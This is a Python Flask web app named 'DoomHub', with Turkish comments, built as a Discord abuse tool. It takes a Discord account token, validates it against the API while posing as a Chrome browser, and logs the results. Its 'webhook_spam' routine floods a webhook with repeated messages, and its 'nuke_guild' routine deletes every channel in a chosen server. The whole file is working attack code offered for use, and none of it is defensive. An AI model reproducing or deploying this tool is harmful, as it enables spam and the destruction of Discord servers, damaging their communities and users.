import os
import requests
import threading
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- ENGINE ---
class DoomHubEngine:
    def __init__(self):
        self.current_token = None
        self.user_name = "User"

    def validate_token(self, token):
        # Tokenın etrafındaki boşluk ve tırnakları temizle
        clean_token = token.strip().replace('"', '').replace("'", "")
        
        # Discord'un gerçek bir tarayıcı sanması için header ekle
        headers = {
            "Authorization": clean_token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            print(f"[LOG] Discord API Status: {r.status_code}") # Render loglarında bunu gör
            
            if r.status_code == 200:
                self.current_token = clean_token
                user_data = r.json()
                print(f"[LOG] Login Successful: {user_data.get('username')}")
                return True
            else:
                print(f"[LOG] Login Failed. Response: {r.text}")
                return False
        except Exception as e:
            print(f"[LOG] Connection Error: {e}")
            return False

    def webhook_spam(self, url, message, count):
        print(f"[LOG] Webhook Spam Started: {url}")
        for i in range(int(count)):
            try:
                requests.post(url, json={"content": message}, timeout=5)
                time.sleep(0.1)
            except:
                break
        print("[LOG] Webhook Spam Finished")

    def nuke_guild(self, guild_id):
        if not self.current_token: return
        headers = {"Authorization": self.current_token}
        print(f"[LOG] Nuke Started for Guild: {guild_id}")
        
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if r.status_code == 200:
            for channel in r.json():
                requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
                print(f"[LOG] Deleted: {channel['name']}")
                time.sleep(0.3)

engine = DoomHubEngine()

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/setup', methods=['POST'])
def setup():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
    
    name = data.get('name', 'yoyo')
    token = data.get('token', '')

    print(f"[LOG] Setup attempt for user: {name}")

    if engine.validate_token(token):
        engine.user_name = name
        return jsonify({"status": "success", "user": name})
    else:
        return jsonify({"status": "error", "message": "Invalid Token"}), 401

@app.route('/api/action', methods=['POST'])
def action():
    data = request.get_json()
    action_type = data.get('type')

    if action_type == 'webhook':
        thread = threading.Thread(target=engine.webhook_spam, args=(data['url'], data['msg'], data['count']))
        thread.start()
    elif action_type == 'nuke':
        thread = threading.Thread(target=engine.nuke_guild, args=(data['guild_id'],))
        thread.start()

    return jsonify({"status": "sent"})

# --- RENDER DEPLOYMENT ---
if __name__ == "__main__":
    # Render'ın verdiği PORT'u kullan, yoksa 5000'den aç
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
